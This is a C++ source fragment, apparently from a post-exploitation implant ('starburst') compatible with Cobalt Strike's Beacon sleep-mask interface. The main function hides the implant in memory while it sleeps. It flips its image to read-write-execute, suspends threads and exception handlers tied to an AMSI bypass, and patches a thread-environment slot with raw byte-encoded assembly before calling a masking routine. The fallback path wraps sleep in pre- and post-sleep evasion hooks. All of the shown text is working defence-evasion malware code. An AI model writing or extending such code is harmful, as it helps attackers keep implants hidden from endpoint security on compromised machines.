        case 5: return reinterpret_cast<gate_5>( fn_ptr )( args[0], args[1], args[2], args[3], args[4] );
        case 6: return reinterpret_cast<gate_6>( fn_ptr )( args[0], args[1], args[2], args[3], args[4], args[5] );
        default: return reinterpret_cast<gate_0>( fn_ptr )();
    }
}

auto declfn evasion_sleepmask_vs_sleep( instance& inst, uint32_t sleep_ms ) -> void {
#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)
    if ( inst.evasion.sleepmask_vs.loaded && inst.evasion.sleepmask_vs.entry ) {
#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
        sm_veh_state veh_state = {};
#endif
        uintptr_t img_base = inst.base.address;
        uint32_t  img_size = inst.base.length;
        if ( inst.evasion.udrl_user_data ) {
            auto ud = reinterpret_cast<USER_DATA*>( inst.evasion.udrl_user_data );
            if ( ud->allocatedMemory ) {
                for ( int ri = 0; ri < 6; ri++ ) {
                    auto& reg = ud->allocatedMemory->AllocatedMemoryRegions[ri];
                    if ( reg.Purpose == PURPOSE_BEACON_MEMORY &&
                         reg.AllocationBase && reg.RegionSize ) {
                        img_base = reinterpret_cast<uintptr_t>( reg.AllocationBase );
                        img_size = static_cast<uint32_t>( reg.RegionSize );
                        break;
                    }
                }
            }
        }

        DWORD pre_prot = 0;
        inst.kernel32.VirtualProtect(
            reinterpret_cast<PVOID>( img_base ),
            img_size,
            PAGE_EXECUTE_READWRITE, &pre_prot );

        BEACON_INFO info;
        HEAP_RECORD sentinel;
        build_beacon_info( inst, info, sentinel );

        FUNCTION_CALL call = {};
        call.functionPtr = reinterpret_cast<PVOID>( inst.kernel32.WaitForSingleObject );
        call.function    = WAITFORSINGLEOBJECT;
        call.numOfArgs   = 2;
        call.args[0]     = reinterpret_cast<ULONG_PTR>( (HANDLE)(LONG_PTR)-1 );
        call.args[1]     = static_cast<ULONG_PTR>( sleep_ms );
        call.bMask       = TRUE;
        call.retValue    = 0;

        DWORD coff_prot = 0;
        inst.kernel32.VirtualProtect(
            inst.evasion.sleepmask_vs.code_base,
            inst.evasion.sleepmask_vs.code_size,
            PAGE_EXECUTE_READWRITE, &coff_prot );

#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
        sm_suspend_veh( inst, veh_state );
#endif
        sm_suspend_threads( inst );

        void* old_aup_sleep;
        __asm__ volatile (
            ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
            : "=a"(old_aup_sleep)
        );
        {
            register void* val __asm__("rcx") = reinterpret_cast<void*>( &inst );
            __asm__ volatile (
                ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
                :: "c"(val) : "memory"
            );
        }

        auto fn = reinterpret_cast<SLEEPMASK_ENTRY>( inst.evasion.sleepmask_vs.entry );
        fn( &info, &call );

        {
            register void* val __asm__("rcx") = old_aup_sleep;
            __asm__ volatile (
                ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
                :: "c"(val) : "memory"
            );
        }

        DWORD coff_restore = 0;
        inst.kernel32.VirtualProtect(
            inst.evasion.sleepmask_vs.code_base,
            inst.evasion.sleepmask_vs.code_size,
            PAGE_EXECUTE_READ, &coff_restore );

        DWORD post_prot = 0;
        inst.kernel32.VirtualProtect(
            reinterpret_cast<PVOID>( img_base ),
            img_size,
            PAGE_EXECUTE_READ, &post_prot );

        sm_resume_threads( inst );
#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
        sm_restore_veh( inst, veh_state );
#endif

        if ( info.heap_records && info.heap_records != &sentinel )
            inst.ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, info.heap_records );

        return;
    }
#endif
    evasion_pre_sleep( inst );
    LARGE_INTEGER delay;
    delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
    inst.ntdll.NtDelayExecution( FALSE, &delay );
    evasion_post_sleep( inst );
}

} // namespace starburst
